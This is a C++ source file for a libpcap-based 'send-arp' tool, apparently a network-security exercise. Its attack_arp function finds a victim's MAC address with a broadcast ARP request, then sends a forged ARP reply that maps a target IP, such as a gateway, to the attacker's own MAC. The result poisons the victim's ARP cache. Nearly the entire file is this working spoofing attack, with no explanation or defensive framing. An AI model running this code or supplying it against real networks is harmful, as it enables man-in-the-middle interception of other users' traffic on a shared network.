#pragma pack(1)

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdlib.h>
#include "ethernet.h"
#include <string>
#include <sys/types.h>
#include "arp.h"
#include <unistd.h>


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");


}
int check_arg(int argc, char*argv){
	if(argc < 4 ){
		usage();
		return EXIT_FAILURE;
	}
	else if((argc % 2 != 0)){
		usage();
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;
}

void arp_request(pcap_t* pcap, char* dev, std::string d_mac_, std::string s_mac_, char* sender_ip, char* target_ip, uint16_t op_){
	uint16_t ether_type = 0x0608;

	Ethernet* ethernet = new Ethernet(d_mac_, s_mac_, ether_type);
	// ethernet->print_ethernet();

	std::string my_ip = get_my_ip(dev);
	// printf("\n%s", my_ip.c_str());
	Arp* arp = new Arp(s_mac_, d_mac_, my_ip, target_ip, op_);
	// arp->print_arp();
	ArpPacket *packet = new ArpPacket(ethernet, arp);
 //
	if(pcap_sendpacket(pcap, (u_char*)packet , sizeof(*packet)) !=0){
		printf("ERROR");
		exit(1);
	}

}

void arp_reply(pcap_t* pcap, char* dev, std::string d_mac_, std::string s_mac_, char* sender_ip, char* target_ip){
	uint16_t ether_type = 0x0608;
	std::string my_mac = get_my_mac(dev);
	Ethernet* ethernet = new Ethernet(d_mac_, s_mac_, ether_type);
	// ethernet->print_ethernet();
	uint16_t op_ = 0x0002;

	Arp* arp = new Arp(s_mac_, d_mac_, sender_ip, target_ip, op_);
	// arp->print_arp();
	ArpPacket *packet = new ArpPacket(ethernet, arp);
	//
	if(pcap_sendpacket(pcap, (u_char*)packet , sizeof(*packet)) !=0){
		printf("ERROR");
		exit(1);
	}

}

ArpPacket get_packet(pcap_t* pcap, std::string mac_){
	uint8_t tmp[6];
	const u_char* packet;
	Ethernet* ethernet ;
	while (true) {
		struct pcap_pkthdr* header;
		// printf("\nWHERE");

		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0){
			continue; //time out
		} else if(res <0){ // error
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		ethernet = (Ethernet*) packet;
		break;
		// ethernet->print_ethernet();
		// stoi_mac(mac_, tmp);
		// if(ethernet->get_ether_type() != 0x0806){
		// 	printf("\nNO????");
		// 	continue;
		// }
		// else if(ethernet->get_d_mac() == tmp){
		// 	printf("\nYES???");
		// 	break;
		// }
	}

	packet = packet +14;
	Arp* arp = (Arp*) packet;
	ArpPacket arp_packet = ArpPacket(ethernet, arp);

	return arp_packet;

}






void attack_arp(int couple, char* dev, char* sender_ip, char* target_ip, pcap_t* pcap){
	//Send Arp Request
	std::string d_mac_  = "ff:ff:ff:ff:ff:ff";
	std::string s_mac_ = get_my_mac(dev);
	std::string my_ip = get_my_ip(dev);
	arp_request(pcap, dev, d_mac_, s_mac_, (char*)my_ip.c_str(), sender_ip, 0x0001); // broadcast to get target's mac'

	ArpPacket taget_packet = get_packet(pcap, s_mac_);
	Ethernet target_packet_ethernet = taget_packet.get_ethernet();
	// taget_packet_ethernet.print_ethernet();
	Arp target_packet_arp = taget_packet.get_arp();
	// taget_packet_arp.print_arp();

	uint8_t* mac_ = target_packet_ethernet.get_s_mac();
	char buf[20]; // enough size
	sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac_[0], mac_[1], mac_[2], mac_[3], mac_[4], mac_[5]);

	std::string target_mac = std::string(buf);
	printf("\n%s\n", target_mac.c_str());



	arp_reply(pcap, dev, target_mac,  s_mac_,  target_ip, sender_ip);



}

int main(int argc, char* argv[]) {
	if(check_arg(argc, *argv)){
		return EXIT_FAILURE;
	}






	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	attack_arp(argc -2 ,dev ,argv[2] , argv[3],  pcap);

	pcap_close(pcap);
}
